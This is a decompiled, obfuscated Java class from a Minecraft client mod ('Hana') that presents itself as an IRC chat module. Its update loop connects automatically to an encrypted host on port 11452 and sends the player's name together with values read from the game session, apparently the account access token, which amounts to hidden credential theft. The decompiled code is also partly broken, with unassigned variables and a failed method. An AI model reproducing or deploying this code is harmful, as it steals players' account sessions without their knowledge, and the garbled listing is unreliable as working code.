/*
 * Decompiled with CFR 0.145.
 * 
 * Could not load the following classes:
 *  net.minecraft.class_2561
 *  net.minecraft.class_310
 *  net.minecraft.class_320
 *  net.minecraft.class_746
 */
package dev.recollect.hana.mod.modules.impl.client;

import dev.recollect.hana.Hana;
import dev.recollect.hana.api.utils.dev.TimeHelper;
import dev.recollect.hana.api.utils.math.FadeUtils;
import dev.recollect.hana.mod.modules.Module;
import dev.recollect.hana.mod.modules.settings.impl.EnumSetting;
import dev.recollect.hana.socket.network.SocketManager;
import dev.recollect.hana.socket.network.buffer.PacketBuffer;
import dev.recollect.hana.socket.network.client.SocketClient;
import dev.recollect.hana.socket.network.packet.Packet;
import dev.recollect.hana.socket.network.packet.impl.info.GameInfoPacket;
import net.minecraft.class_2561;
import net.minecraft.class_310;
import net.minecraft.class_320;
import net.minecraft.class_746;
import org.bytedeco.javacv.BaseSettings;

public class IRC
extends Module {
    public final EnumSetting<type> tp;
    private String lastName;
    public static IRC INSTANCE;

    @Override
    public void onDisable() {
        IRC a;
        a.reset();
        if (Hana.IRC.getClient().isConnected()) {
            Hana.IRC.getClient().disconnect();
        }
    }

    public void reset() {
        a.lastName = null;
    }

    public IRC() {
        IRC a;
        IRC iRC = a;
        super(TimeHelper.ALLATORIxDEMO("6%v"), BaseSettings.ALLATORIxDEMO("F[tUwRlC\"}\u001b#i\u0005HV{["), Module.Category.Client);
        iRC.tp = a.add(new EnumSetting<type>(TimeHelper.ALLATORIxDEMO("i\u0006\u0007P"), type.Notify));
        iRC.setChinese(BaseSettings.ALLATORIxDEMO("wHl"));
        INSTANCE = iRC;
    }

    @Override
    public void onUpdate() {
        String a;
        IRC iRC = a;
        a = String.valueOf((Object)IRC.mc.field_1724.method_5477());
        if (Hana.IRC.getClient().isConnected()) {
            if (iRC.lastName == null || !iRC.lastName.equals(a)) {
                Hana.IRC.send(new GameInfoPacket(a, mc.method_1548().method_1674(), mc.method_1548().method_1675(), System.currentTimeMillis()));
                iRC.lastName = a;
                return;
            }
        } else if (!Hana.IRC.getClient().isConnecting()) {
            Hana.IRC.getClient().start(TimeHelper.ALLATORIxDEMO("LW\u0007I\u0004\u0013\u000bC\u001e"), 11452);
        }
    }

    @Override
    public void onEnable() {
        IRC a;
        a.reset();
    }

    public static final class type
    extends Enum<type> {
        public static final /* enum */ type Notify = new type(PacketBuffer.ALLATORIxDEMO(",j\u001fe\u0018`"), 0);
        public static final /* enum */ type Chat = new type(FadeUtils.ALLATORIxDEMO("2HZ\u001e"), 1);
        private static final /* synthetic */ type[] $VALUES;

        static {
            $VALUES = type.$values();
        }

        private static /* synthetic */ type[] $values() {
            type[] arrtype = new type[2];
            arrtype[0] = Notify;
            arrtype[1] = Chat;
            return arrtype;
        }

        public static type valueOf(String a) {
            return Enum.valueOf(type.class, a);
        }

        /*
         * Exception decompiling
         */
        private /* synthetic */ type() {
            // This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
            // java.lang.IllegalStateException
            // org.benf.cfr.reader.bytecode.analysis.variables.VariableFactory.localVariable(VariableFactory.java:53)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.mkRetrieve(Op02WithProcessedDataAndRefs.java:931)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.createStatement(Op02WithProcessedDataAndRefs.java:979)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.access$100(Op02WithProcessedDataAndRefs.java:56)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs$11.call(Op02WithProcessedDataAndRefs.java:2060)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs$11.call(Op02WithProcessedDataAndRefs.java:2057)
            // org.benf.cfr.reader.util.graph.AbstractGraphVisitorFI.process(AbstractGraphVisitorFI.java:60)
            // org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.convertToOp03List(Op02WithProcessedDataAndRefs.java:2069)
            // org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:342)
            // org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:184)
            // org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:129)
            // org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:96)
            // org.benf.cfr.reader.entities.Method.analyse(Method.java:397)
            // org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:901)
            // org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:778)
            // org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:886)
            // org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:797)
            // org.benf.cfr.reader.Driver.doClass(Driver.java:58)
            // org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:67)
            // org.benf.cfr.reader.Main.main(Main.java:48)
            throw new IllegalStateException("Decompilation failed");
        }

        public static type[] values() {
            return (type[])$VALUES.clone();
        }
    }

}
